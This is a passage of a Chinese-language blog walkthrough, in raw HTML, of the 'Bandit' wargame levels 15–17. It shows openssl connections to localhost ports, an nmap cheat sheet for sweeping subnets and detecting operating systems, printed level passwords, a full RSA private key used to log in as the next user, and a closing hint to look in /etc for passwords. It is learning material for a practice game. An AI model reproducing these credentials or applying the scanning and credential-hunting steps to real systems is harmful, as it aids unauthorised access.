class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">bandit15@bandit:~$ openssl s_client -connect localhost:30001</span><br><span class="line">CONNECTED(00000003)</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify error:num=18:self signed certificate</span><br><span class="line">verify return:1</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify return:1</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:/CN=localhost</span><br><span class="line">   i:/CN=localhost</span><br><span class="line">---</span><br><span class="line">Server certificate</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIICBjCCAW+gAwIBAgIEBuAgAjANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls</span><br><span class="line">b2NhbGhvc3QwHhcNMTgxMDE2MTIwMzI3WhcNMTkxMDE2MTIwMzI3WjAUMRIwEAYD</span><br><span class="line">VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMAzS7Wa</span><br><span class="line">lf+m6OTRah6FDYL0q/DxznPWB4sF5gs5IQwtGO4SqNODkhck/xz1EvJK+rSpAx0H</span><br><span class="line">qRWS6n12gs0xt0amU+krwitJ1XeZ4IZGpd5EwTMU7+AR0KO6Z9Xvmfs4TsOFvfHF</span><br><span class="line">vBMYM04V3/O6P+/DBtD75nYLrflqLwVLDwo1AgMBAAGjZTBjMBQGA1UdEQQNMAuC</span><br><span class="line">CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0</span><br><span class="line">ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3</span><br><span class="line">DQEBBQUAA4GBAF+BtyNMesHZTXXKxhJhv7e4WYMcFGPiUlhM/O8DGRuA4UoMeXpO</span><br><span class="line">iSocOtYnOcDiOGzJmFWAwMFz6qAUSwb0lkKpbY2kNJHJ6jmSI2j+houZmVLUgvQr</span><br><span class="line">vCoD6KL5krLQ9JFjIhyBzIVq2C3HV15N0miFFBTVOI/6FC/TTEeZZxzB</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">subject=/CN=localhost</span><br><span class="line">issuer=/CN=localhost</span><br><span class="line">---</span><br><span class="line">No client certificate CA names sent</span><br><span class="line">Peer signing digest: SHA512</span><br><span class="line">Server Temp Key: X25519, 253 bits</span><br><span class="line">---</span><br><span class="line">SSL handshake has read 1019 bytes and written 269 bytes</span><br><span class="line">Verification error: self signed certificate</span><br><span class="line">---</span><br><span class="line">New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">Server public key is 1024 bit</span><br><span class="line">Secure Renegotiation IS supported</span><br><span class="line">Compression: NONE</span><br><span class="line">Expansion: NONE</span><br><span class="line">No ALPN negotiated</span><br><span class="line">SSL-Session:</span><br><span class="line">    Protocol  : TLSv1.2</span><br><span class="line">    Cipher    : ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">    Session-ID: 8811BE3C2A33A03BD25B2A509F5827D0EA33984E87067C9495ED1AD12AA762F7</span><br><span class="line">    Session-ID-ctx: </span><br><span class="line">    Master-Key: 17866C85119DB2C4F4818F42CE515CCCA96E06C60DEB36E53A715448E221E652B9DF2BE0BA00DBA1CF586ABC2569867B</span><br><span class="line">    PSK identity: None</span><br><span class="line">    PSK identity hint: None</span><br><span class="line">    SRP username: None</span><br><span class="line">    TLS session ticket lifetime hint: 7200 (seconds)</span><br><span class="line">    TLS session ticket:</span><br><span class="line">    0000 - 4d 71 e2 4a 89 ec b5 87-ae 3b 55 9c 1b 55 0b bc   Mq.J.....;U..U..</span><br><span class="line">    0010 - bb b1 e9 26 7c ab 39 d0-27 a4 12 11 02 a9 da 4a   ...&amp;|.9.&apos;......J</span><br><span class="line">    0020 - d0 9a c6 9b e3 9f 14 f3-4c 0c 02 76 d5 35 21 0d   ........L..v.5!.</span><br><span class="line">    0030 - 7c 9f f3 7b a3 be 1d a9-68 d3 ee 8e 4c a0 7c 88   |..&#123;....h...L.|.</span><br><span class="line">    0040 - 08 09 a2 c5 2d 5e b4 3c-d0 cd 4b 42 16 cd 7b 3f   ....-^.&lt;..KB..&#123;?</span><br><span class="line">    0050 - b6 bf d3 ca 86 4e b5 e9-7b cf 20 99 a9 ab 2e 65   .....N..&#123;. ....e</span><br><span class="line">    0060 - 70 7c be 14 4d 61 21 4d-49 ea 37 56 3e d8 e0 6d   p|..Ma!MI.7V&gt;..m</span><br><span class="line">    0070 - cb 50 e7 8b 5b df 80 14-a3 ac a0 13 26 73 03 09   .P..[.......&amp;s..</span><br><span class="line">    0080 - 96 bd ef b8 e4 7d a9 0a-49 e7 46 54 3f 82 c9 e0   .....&#125;..I.FT?...</span><br><span class="line">    0090 - ef 52 13 48 bd 2c 66 be-56 5e a9 50 16 08 12 6d   .R.H.,f.V^.P...m</span><br><span class="line">    Start Time: 1540907808</span><br><span class="line">    Timeout   : 7200 (sec)</span><br><span class="line">    Verify return code: 18 (self signed certificate)</span><br><span class="line">    Extended master secret: yes</span><br><span class="line">---</span><br><span class="line">BfMYroe26WYalil77FoDi9qh59eK5xNr</span><br><span class="line">Correct!</span><br><span class="line">cluFn7wTiGryunymYOu4RcffSxQluehd</span><br><span class="line">closed</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-16-17"><a href="#bandit-16-17" class="headerlink" title="bandit 16-17"></a>bandit 16-17</h2><p>Level Goal<br>The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.<br>Commands you may need to solve this level<br>ssh, telnet, nc, openssl, s_client, nmap<br>需要我们扫描一下在31000-32000端口开放的服务，其中一个我们提交上一关答案就会告诉我们下一关答案、<br>nmap命令详细介绍：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.**.0/24    扫描目标IP段，查看有哪些IP存活</span><br><span class="line">nmap 192.168.**.1-100     扫描从192.168.**.1-192.168.**.100有哪些IP存活</span><br><span class="line">nmap -iL ip_addr     扫描文件ip_addr文件中所存储的IP地址有哪些存活，并扫描存活IP主机所打开的端口（需要创建ip_addr文件，并将预扫描IP写入 ip_addr文件中。创建文件：touch ip_addr写入扫描的eth0网卡：eth0 &quot;192.168.**.1 192.168.**.2&quot;&gt; ip_addr）</span><br><span class="line">nmap -p0-65535 192.168.**.1    扫描目标主机的所有端口（端口号从0-65535）</span><br><span class="line">nmap -p21,22,80,3389 192.168.**.1    扫描目标主机的部分端口</span><br><span class="line">nmap -O 192.168.**.1    扫描识别目标主机的系统（可以识别系统内核，但有时不能精确识别系统）</span><br></pre></td></tr></table></figure><br>开始扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bandit16@bandit:~$ nmap localhost -p 31000-32000</span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2018-10-30 15:26 CET</span><br><span class="line">Nmap scan report for localhost (127.0.0.1)</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">31518/tcp open  unknown</span><br><span class="line">31790/tcp open  unknown</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds</span><br></pre></td></tr></table></figure><br>我们看到31518和31790都是开着的，我们一个一个服务去试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">首先：openssl s_client -connect localhost:31518</span><br><span class="line">bandit16@bandit:~$ openssl s_client -connect localhost:31518</span><br><span class="line">CONNECTED(00000003)</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify error:num=18:self signed certificate</span><br><span class="line">verify return:1</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify return:1</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:/CN=localhost</span><br><span class="line">   i:/CN=localhost</span><br><span class="line">---</span><br><span class="line">Server certificate</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIICBjCCAW+gAwIBAgIEMLG+bjANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls</span><br><span class="line">b2NhbGhvc3QwHhcNMTgxMDE2MTIwMzI3WhcNMTkxMDE2MTIwMzI3WjAUMRIwEAYD</span><br><span class="line">VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAL0RyGS1</span><br><span class="line">i69cWe+nvIuy5jbTI7iRjYRG/VxLwVBMK8fgDUtLBB+XcI/7t1jzT3RHtLnLIvkM</span><br><span class="line">+gwA6aLFjm4IUUER1czUCIDV3aRqXTrFfc/Q4qD93RiRNiRB2TRBXcXn4UyObYeR</span><br><span class="line">vx+JwVsn+hCBNhLxr6h44g2xhhOapb9AAKx/AgMBAAGjZTBjMBQGA1UdEQQNMAuC</span><br><span class="line">CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0</span><br><span class="line">ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3</span><br><span class="line">DQEBBQUAA4GBAI/obrHO1LZ6NaQNN6mSq48DyI0pM5ew+aA/12MEKzKiOMBvl9oi</span><br><span class="line">LmFYldH4/2w0LjVX/ahvTERZAGI0n03FmP3b2lsP5cvi+74uRdqWB9A7EmE86b/3</span><br><span class="line">yeiNtz10ZS0NPrv/f51H6V0E2B07WoQcHZtqiKTnvQssyXeZ5R6rExD9</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">subject=/CN=localhost</span><br><span class="line">issuer=/CN=localhost</span><br><span class="line">---</span><br><span class="line">No client certificate CA names sent</span><br><span class="line">Peer signing digest: SHA512</span><br><span class="line">Server Temp Key: X25519, 253 bits</span><br><span class="line">---</span><br><span class="line">SSL handshake has read 1019 bytes and written 269 bytes</span><br><span class="line">Verification error: self signed certificate</span><br><span class="line">---</span><br><span class="line">New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">Server public key is 1024 bit</span><br><span class="line">Secure Renegotiation IS supported</span><br><span class="line">Compression: NONE</span><br><span class="line">Expansion: NONE</span><br><span class="line">No ALPN negotiated</span><br><span class="line">SSL-Session:</span><br><span class="line">    Protocol  : TLSv1.2</span><br><span class="line">    Cipher    : ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">    Session-ID: 50D211034F68E13230C343A3F0063A226667E0390D64D4C6B6663914A1E7073B</span><br><span class="line">    Session-ID-ctx: </span><br><span class="line">    Master-Key: 4209E5BC4EE8A462F0905C0DC9EC6874396F2EE2B75E5693CB4DB07B24AD355A25807AB78820D51AC759A9621AF63523</span><br><span class="line">    PSK identity: None</span><br><span class="line">    PSK identity hint: None</span><br><span class="line">    SRP username: None</span><br><span class="line">    TLS session ticket lifetime hint: 7200 (seconds)</span><br><span class="line">    TLS session ticket:</span><br><span class="line">    0000 - 12 b6 a9 22 82 e8 26 1e-12 8c c6 35 06 8e d8 3d   ...&quot;..&amp;....5...=</span><br><span class="line">    0010 - 1b 69 39 c4 35 58 cd 51-6c db 0a b0 e2 5f e7 3b   .i9.5X.Ql...._.;</span><br><span class="line">    0020 - d7 88 ff b6 c5 75 23 fc-4f 75 b8 20 60 ff 45 b6   .....u#.Ou. .E.</span><br><span class="line">    0030 - 14 cb 57 88 d0 4f bd 8e-a3 d2 2a e6 87 a5 6c 3b   ..W..O....*...l;</span><br><span class="line">    0040 - 2f ab 93 04 e3 88 93 c7-26 08 39 8c ba bd de bd   /.......&amp;.9.....</span><br><span class="line">    0050 - c0 6b 73 0b 8b 3a 51 25-41 31 15 34 ea 14 9a 83   .ks..:Q%A1.4....</span><br><span class="line">    0060 - ba 13 78 07 b8 df 42 e6-6d d6 8e 1e ad 24 e3 5e   ..x...B.m....$.^</span><br><span class="line">    0070 - 27 03 f6 91 ad 4c 9a d2-d9 93 76 c1 30 e9 20 b9   &apos;....L....v.0. .</span><br><span class="line">    0080 - 7b e8 6e b0 6f e2 de 5a-f6 0a 5c dc 88 41 29 01   &#123;.n.o..Z..\..A).</span><br><span class="line">    0090 - be 4d 30 74 9f e6 89 0d-24 f8 55 66 65 a6 5b 58   .M0t....$.Ufe.[X</span><br><span class="line">    Start Time: 1540910016</span><br><span class="line">    Timeout   : 7200 (sec)</span><br><span class="line">    Verify return code: 18 (self signed certificate)</span><br><span class="line">    Extended master secret: yes</span><br></pre></td></tr></table></figure><br>发现并没有什么东西<br>接下来试试另一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">bandit16@bandit:~$ openssl s_client -connect localhost:31790</span><br><span class="line">CONNECTED(00000003)</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify error:num=18:self signed certificate</span><br><span class="line">verify return:1</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify return:1</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:/CN=localhost</span><br><span class="line">   i:/CN=localhost</span><br><span class="line">---</span><br><span class="line">Server certificate</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIICBjCCAW+gAwIBAgIEMAgpsDANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls</span><br><span class="line">b2NhbGhvc3QwHhcNMTgxMDE2MTIwMzI3WhcNMTkxMDE2MTIwMzI3WjAUMRIwEAYD</span><br><span class="line">VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAK+XDMVP</span><br><span class="line">Gsi0v7AzOt9+Y1xJ7B5H4rMm9MHwPjDQhijVETNjVueyvESNsCsYoTkZ9iCrShWZ</span><br><span class="line">pbMY/5VrlLOPNCx04JqaV5dvJYqFRT7OlhlHbmCq83r0Wd6GdbqjACyj3//qQeZy</span><br><span class="line">9H0utj6DwuD0qWkAEXAwL47Zlo4femahXMSrAgMBAAGjZTBjMBQGA1UdEQQNMAuC</span><br><span class="line">CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0</span><br><span class="line">ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3</span><br><span class="line">DQEBBQUAA4GBAHSG/pfoYiHL3VU2FutcjcBEYFxJnDa/Dscz3xIb0A1x8dHCP1Xw</span><br><span class="line">90wlU2kbPfK8XnHDkOjj7O6b+4D4EjkhLSQEq/8S8JSPfJSxXg6gBfBpqUrgyM+P</span><br><span class="line">4Ivq7l+JHjXHe0yRXCGiea1n6KAe3u535WeFHWGbz4ncUTxbdgpM7DZW</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">subject=/CN=localhost</span><br><span class="line">issuer=/CN=localhost</span><br><span class="line">---</span><br><span class="line">No client certificate CA names sent</span><br><span class="line">Peer signing digest: SHA512</span><br><span class="line">Server Temp Key: X25519, 253 bits</span><br><span class="line">---</span><br><span class="line">SSL handshake has read 1019 bytes and written 269 bytes</span><br><span class="line">Verification error: self signed certificate</span><br><span class="line">---</span><br><span class="line">New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">Server public key is 1024 bit</span><br><span class="line">Secure Renegotiation IS supported</span><br><span class="line">Compression: NONE</span><br><span class="line">Expansion: NONE</span><br><span class="line">No ALPN negotiated</span><br><span class="line">SSL-Session:</span><br><span class="line">    Protocol  : TLSv1.2</span><br><span class="line">    Cipher    : ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">    Session-ID: 6D46D124A250EED08014EE5A0C85271B86CEFF6728A4B866A4A9B62FC3ED1F71</span><br><span class="line">    Session-ID-ctx: </span><br><span class="line">    Master-Key: 67CEB3CFB568E22B2ED14F3259C7EEA720F230E4267500507E4AB52E1888F1D8B26BB2C364F84CFE9B2863287BD283A5</span><br><span class="line">    PSK identity: None</span><br><span class="line">    PSK identity hint: None</span><br><span class="line">    SRP username: None</span><br><span class="line">    TLS session ticket lifetime hint: 7200 (seconds)</span><br><span class="line">    TLS session ticket:</span><br><span class="line">    0000 - f7 99 0d 1d ee b2 67 e6-7e 92 43 0a a2 e5 e4 90   ......g.~.C.....</span><br><span class="line">    0010 - c2 5d 4e bc 49 93 53 f9-db 2a 69 e1 b1 27 fe 68   .]N.I.S..*i..&apos;.h</span><br><span class="line">    0020 - da 41 e9 12 1a c0 3e 1c-4e 33 e5 f1 3f a9 12 66   .A....&gt;.N3..?..f</span><br><span class="line">    0030 - 19 5c 8e e6 d5 5d d1 43-43 79 35 b1 30 ba e1 ed   .\...].CCy5.0...</span><br><span class="line">    0040 - d1 66 e3 d7 7c d7 ba 2e-0f 1f 2e 09 f1 cb 80 32   .f..|..........2</span><br><span class="line">    0050 - 7f 6c 8f 63 99 91 94 19-c4 54 75 cd d3 f2 a5 3d   .l.c.....Tu....=</span><br><span class="line">    0060 - e4 f5 1a 20 31 96 e6 71-a8 90 0a ed 8b b0 b8 15   ... 1..q........</span><br><span class="line">    0070 - ff a1 0e a7 4f 44 80 d2-75 d6 4e 70 57 d0 33 c6   ....OD..u.NpW.3.</span><br><span class="line">    0080 - ab 78 96 cc 00 2c 54 f4-19 43 0a 5a 3f 4c 71 b9   .x...,T..C.Z?Lq.</span><br><span class="line">    0090 - 8c 0c 00 be 62 3c 0c 2b-31 38 4b 42 3a 14 af 3a   ....b&lt;.+18KB:..:</span><br><span class="line">    Start Time: 1540910183</span><br><span class="line">    Timeout   : 7200 (sec)</span><br><span class="line">    Verify return code: 18 (self signed certificate)</span><br><span class="line">    Extended master secret: yes</span><br><span class="line">---</span><br><span class="line">cluFn7wTiGryunymYOu4RcffSxQluehd</span><br><span class="line">Correct!</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ</span><br><span class="line">imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ</span><br><span class="line">Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu</span><br><span class="line">DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW</span><br><span class="line">JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX</span><br><span class="line">x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD</span><br><span class="line">KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl</span><br><span class="line">J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd</span><br><span class="line">d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC</span><br><span class="line">YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A</span><br><span class="line">vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama</span><br><span class="line">+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT</span><br><span class="line">8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx</span><br><span class="line">SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd</span><br><span class="line">HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt</span><br><span class="line">SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A</span><br><span class="line">R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi</span><br><span class="line">Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg</span><br><span class="line">R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu</span><br><span class="line">L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni</span><br><span class="line">blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU</span><br><span class="line">YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM</span><br><span class="line">77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b</span><br><span class="line">dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3</span><br><span class="line">vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">closed</span><br></pre></td></tr></table></figure></p>
<p>可以看到成功了，我们现在把私钥保存一下，然后用私钥去登陆bandit17账户获得下一关密码<br>这我们首先需要创建一个文件来保存私钥，这个文件需要在自己的目录下，用vi命令就可以创建，然后：wq！就行<br>这一关做了两天。。。前面一直写文件有问题在最后用了qwe大佬的文件夹私钥连上去了,手动感谢大佬<br>来个完整的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">bandit16@bandit:~$ nmap localhost -p 31000-32000</span><br><span class="line">bandit16@bandit:~$ openssl s_client -connect localhost:31790</span><br><span class="line">这里就需要复制私钥保存为1.private</span><br><span class="line">bandit16@bandit:~$ cd /tmp/bobo123</span><br><span class="line">bandit16@bandit:/tmp/bobo123$ ls -a</span><br><span class="line">.  ..  1.private</span><br><span class="line">bandit16@bandit:/tmp/bobo123$ ssh -i 1.private bandit17@localhost</span><br><span class="line">这里省略一点连接步骤下面是已经显示连接成功</span><br><span class="line">bandit17@bandit:~$ ls -a</span><br><span class="line">.   .bandit16.password  .bashrc        passwords.old  .ssh</span><br><span class="line">..  .bash_logout        passwords.new  .profile</span><br><span class="line">发现没有我们要的17关密码，linux系统有个etc文件夹里面会有很多密码什么的我们cd过去</span><br><span 